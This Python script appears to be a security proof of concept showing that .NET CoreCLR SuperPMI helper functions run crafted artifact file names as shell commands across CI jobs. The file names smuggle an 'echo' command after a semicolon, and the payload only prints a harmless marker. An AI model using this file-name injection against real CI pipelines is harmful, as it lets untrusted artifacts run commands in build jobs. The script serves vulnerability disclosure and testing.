#!/usr/bin/env python3
"""CoreCLR #14: controlled cross-job artifact trust-boundary simulation.

PRODUCE runs in a low-trust surrogate GitHub job and creates filename-only
dummy assemblies. CONSUME runs in a different GitHub job with *read-only*
GitHub permission and imports the producer's archived artifacts. It calls
the original .NET file-staging and PMI function ASTs from immutable snapshots.

No real Microsoft systems, credentials, privilege changes, binaries, or
network targets are accessed. A harmless marker is printed to confirm that
the consumer process parsed data as shell syntax. These results demonstrate
a *conditional* CI hazard, not Microsoft CI compromise.
"""
import ast
import asyncio
import datetime
import hashlib
import json
import logging
import os
import re
import shutil
import sys
import tempfile
from pathlib import Path
from types import SimpleNamespace

ROOT = Path(__file__).resolve().parents[2]
SOURCES = {
    "dotnet-10.0.15": ROOT / "release-sources/dotnet-10.0.15/runtime/src/coreclr/scripts",
    "dotnet-11.0.100": ROOT / "scan-target-v11.0.100/src/runtime/src/coreclr/scripts",
}
MARKER = "CORECLR14_CROSS_JOB_MARKER"
MALICIOUS_FILENAMES = (
    "artifact; echo " + MARKER + "; #.dll",
    "artifact; echo " + MARKER + "; #.exe",
)
CONTROL_FILENAMES = ("normal.dll", "file with spaces.exe")


def extract(path, functions, environment):
    tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
    nodes = [
        n for n in ast.walk(tree)
        if isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef))
        and n.name in functions
    ]
    for name in functions:
        assert sum(n.name == name for n in nodes) == 1, (path, name)
    module = ast.fix_missing_locations(ast.Module(body=nodes, type_ignores=[]))
    exec(compile(module, str(path), "exec"), environment)
    return [environment[name] for name in functions]


def safe_prefix(value):
    return re.sub("[^a-zA-Z0-9_.-]", "_", value)[-60:]


def produce(outdir):
    outdir.mkdir(parents=True, exist_ok=True)
    records = []
    for i, name in enumerate(CONTROL_FILENAMES + MALICIOUS_FILENAMES):
        payload = outdir / name
        payload.write_bytes(b"")  # File *name* is the input, not assembly contents.
        records.append({
            "name": name, "kind": "crafted" if i >= len(CONTROL_FILENAMES) else "control",
            "sha256": hashlib.sha256(payload.read_bytes()).hexdigest(),
        })
    (outdir / "manifest.json").write_text(
        json.dumps({"purpose": "read-only cross-job simulation", "files": records},
                   indent=2), encoding="utf-8")
    print(json.dumps({"phase": "producer", "record_count": len(records),
                      "no_executable_payload": True}, indent=2))


async def consume(indir):
    manifest = json.loads((indir / "manifest.json").read_text(encoding="utf-8"))
    items = manifest["files"]
    assert len(items) == 4
    assert [x["name"] for x in items] == list(CONTROL_FILENAMES + MALICIOUS_FILENAMES)
    for x in items:
        path = indir / x["name"]
        assert path.is_file(), f"GitHub artifact altered or removed filename: {x['name']}"
        assert hashlib.sha256(path.read_bytes()).hexdigest() == x["sha256"]

    summary = {"phase": "consumer", "artifact_integrity": True, "results": {}}
    with tempfile.TemporaryDirectory(prefix="clr14_artifact_bridge_") as temp:
        base = Path(temp)
        stub = base / "pmi_stub.py"
        stub.write_text("import sys\nprint('PMI_STUB', repr(sys.argv[1:]))\n",
                        encoding="utf-8")
        for ver, folder in SOURCES.items():
            scope = {
                "os": os, "shutil": shutil, "MAX_FILES_COUNT": 1500,
                "native_binaries_to_ignore": [], "asyncio": asyncio,
                "datetime": datetime, "logging": logging, "tempfile": tempfile,
                "make_safe_filename": safe_prefix,
                "is_zero_length_file": lambda p: os.path.getsize(p) == 0,
                "write_file_to_log": lambda *args, **kwargs: None,
                "pmi_command_env": dict(os.environ),
            }
            extract(folder / "jitutil.py", ["copy_files"], scope)
            extract(folder / "superpmi_collect_setup.py",
                    ["get_files_sorted_by_size", "first_fit", "partition_files"],
                    scope)
            (run_pmi,) = extract(folder / "superpmi.py", ["run_pmi"], scope)
            stage = base / ("staged_" + ver)
            scope["partition_files"](str(indir), str(stage), max_size=1_000_000,
                                     exclude_directories=[], exclude_files=[])
            cases = []
            for index, entry in enumerate(items):
                staged_file = next(stage.rglob(entry["name"]), None)
                assert staged_file and staged_file.is_file(), entry
                logdir = base / (ver + "_logs_" + str(index))
                logdir.mkdir()
                context = SimpleNamespace(corerun=sys.executable,
                                          pmi_location=str(stub),
                                          temp_location=str(logdir))
                await run_pmi("", str(staged_file), context)
                logs = "\n".join(
                    x.read_text(encoding="utf-8", errors="replace")
                    for x in logdir.iterdir() if x.suffix in (".stdout", ".stderr")
                )
                detected = any(line.strip() == MARKER for line in logs.splitlines())
                expected = entry["kind"] == "crafted"
                assert detected == expected, (ver, entry, detected, logs[-1000:])
                cases.append({"kind": entry["kind"], "name_survived": True,
                              "shell_marker_executed": detected})
            summary["results"][ver] = cases
    print(json.dumps(summary, indent=2))
    print("SUCCESS: contributor-surrogate artifact crossed a synthetic CI job boundary")


if __name__ == "__main__":
    if len(sys.argv) != 3 or sys.argv[1] not in ("produce", "consume"):
        raise SystemExit("usage: artifact_trust_bridge.py produce|consume DIRECTORY")
    if sys.platform != "linux":
        raise SystemExit("This cross-job artifact simulation runs on Linux only")
    if sys.argv[1] == "produce":
        produce(Path(sys.argv[2]).resolve())
    else:
        asyncio.run(consume(Path(sys.argv[2]).resolve()))
